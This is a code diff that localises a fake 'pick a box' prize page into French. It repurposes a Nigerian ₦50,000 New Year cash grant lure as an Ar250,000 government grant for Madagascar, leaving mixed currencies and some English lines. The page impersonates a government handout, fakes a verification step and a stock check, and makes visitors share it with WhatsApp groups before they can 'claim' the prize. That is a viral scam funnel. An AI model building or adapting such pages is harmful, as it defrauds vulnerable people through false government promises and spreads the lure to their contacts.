@@ -309,13 +309,13 @@ Vous devez sélectionner la boîte qui contient le cadeau à l'intérieur des bo
 </p>
    <br>
 <button class="button" v-on:click="showInstructionsModal = false">
-Start
+Commencer
 </button>
 </vue-modal>
 <vue-modal :open="showFailModal">
-<h2 class="heading heading--h1">Better luck next time</h2>
+<h2 class="heading heading--h1">Meilleure chance la prochaine fois</h2>
 <p class="paragraph">
-You have (2) extra chances. 
+Vous avez (2) chances supplémentaires. 
 </p>
    <br>
 <button class="button" v-on:click="showFailModal = false">
@@ -324,11 +324,11 @@ OK
 </vue-modal>
 <vue-modal :open="showSuccessModal">
 <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEikw4KvY3ouLY9iqVMpz6ziuhlkYN4ezGMGwIFmNjc5zFkeeTjUxjtL6YQCQC5Ba4FX0hZDA5H-LDXtcSkM61jsd7dp1HBRs0Ko6kZH7TEQ6AAPAiyU9WeE4qpFN7UM5QwsH_wPPvowTDgRmzwEZ-edP_oFyqbWJ7odZT2fswSlXBJK3KZDyXBwz2beBFlp/s320/4845523E-D4DD-4D00-9B2C-6EF6A5C30EDD.png" style="width: 240px;">
-<h1 class="heading heading--h1">Congratulations! </h1>
+<h1 class="heading heading--h1">Félicitations! </h1>
 <p class="paragraph">
 
 
-Your Prize is: <b> ₦50,000 cash</b><br>Follow the instructions on the next page to claim your prize ! 
+Votre prix est de: <b> Ar250,000 en espèces</b><br>Suivez les instructions sur la page suivante pour réclamer votre subvention en espèces ! 
 </p>
     <br>
 <button class="button" v-on:click="$confetti.stop()" onclick="go();">
@@ -348,9 +348,9 @@ Ok
 Hello!
 </h1>
   <p class="paragraph">
-Welcome to <b>subventions en espèces du gouvernement de Ar250,000 destinées à tous les habitants de Madagascar</b>, Dont miss this year Sule ₦50,000 New Year cash grant to NIGERIANS.
+Bienvenue aux  <b>subventions en espèces du gouvernement de Ar250,000 destinées à tous les habitants de Madagascar</b>, Dont miss this year Sule ₦50,000 New Year cash grant to NIGERIANS.
 <br>
-Answer the questions below to claim <b>₦50,000 Cash Prize</b>
+Répondez aux questions ci-dessous pour réclamer une subvention  <b>Ar250,000 en espèces Prize</b>
 </p>
   <br>
 </div>
@@ -360,14 +360,14 @@ Answer the questions below to claim <b>₦50,000 Cash Prize</b>
 
 <div class="verify" v-if="showRotator">
 <vue-text-rotator v-on:rotate="rotate" v-on:finished="onRotatorFinished" :strings='[
-                     "Please wait a moment...",
-              "Please wait a moment...",
-              "Please wait a moment..."
+                     "Veuillez patienter un instant...",
+              "Veuillez patienter un instant...",
+              "Veuillez patienter un instant..."
             ]'>
 </vue-text-rotator>
 <div class="verify__text" v-if="rotateIndex > 1">
 <strong>
-You have answered 4/4 of the questions
+Veuillez patienter un instant
 </strong>
 <img class="verify__icon verify__icon--checked" src="https://olului.pages.dev/img/landers/survey-pick-a-box/checked.png" alt="" />
 </div>
@@ -423,14 +423,14 @@ Stock is being checked
   <div id="share">
     
 <div class="title1">
-<p>Congratulations! </p>
+<p>Félicitations! </p>
 </div>
 <div class="weui_dialog_img prize_img" style="text-align: center;margin: 20px 0;">
                                 <center>   <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhTxs6WlixGw8THHR5goyUkJYeQ3ETHo0NZoX1Nq06Wrmb2d7g0v5lu7cBqPq8YF7JQM-q7A4sxHjuI0LkictyC7PEh98TDOC5M5r3ei2HjyVKDW2cTUYQHkOAhcZMc4QiN9fmi2xi0QmPvWchppQiHKk1drz52NlNwpIMys4fG5oI4rQ4H3C1w67FeumCQ/s1600/NASARAWA_GOV_2020.jpg" width='81%'/> </center>
                            
 
                             </div>
-<p class="txt1">Your Prize is: <b>₦50,000</b> <br>Follow the instructions below to your prize !</p>
+<p class="txt1">Votre prix est de : <b>₦50,000</b> <br>Follow the instructions below to your prize !</p>
       <div class="bottom" id='buttonO'>
 <div id="lastapp"><p class="rules">1.share with 5 groups / 15 friends on "Whatsapp" (click the "Whatsapp" icon below)</p><p class="rules">2. Click "Continue" and claim your prize.</p></div>
 
@@ -460,14 +460,14 @@ Stock is being checked
                       
     <div id="claim">
       <div class="title1">
-<p>Congratulations! </p>
+<p>Félicitations! </p>
 </div>
 <div class="weui_dialog_img prize_img" style="text-align: center;margin: 20px 0;">
                                 <center>   <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiKurgY27cr6Irpf8UXVlC3t3wTUjgBxPlEK8K8G726fZ8WojGqXQoHRoOUgKwD7LZqlIXntCC3Lz5uVpMs1X3HpL9sL8tuyQolA94aO575XHRDFiGV38iw3J4hyphenhyphenuoXFAe9HFVfpfewX3cTbh5Iu9Wp3TEpKhdA2A_q-lelllKPTIWugRPtKBRu6XyT-THV/s16000/naira%20notes.jpg" width='81%'/> </center>
                            
 
                             </div>
-<p class="txt1">Your Prize is: <b>₦50,000 cash.</b> <br>Follow the instruction below to claim your prize !</p>
+<p class="txt1">Votre prix est de : <b>Ar250,000 en espèces.</b> <br>Follow the instruction below to claim your prize !</p>
             <p class="done"><i class="fa fa-check-circle fa-3x" aria-hidden="true"></i></p>   
         <br>
 	    
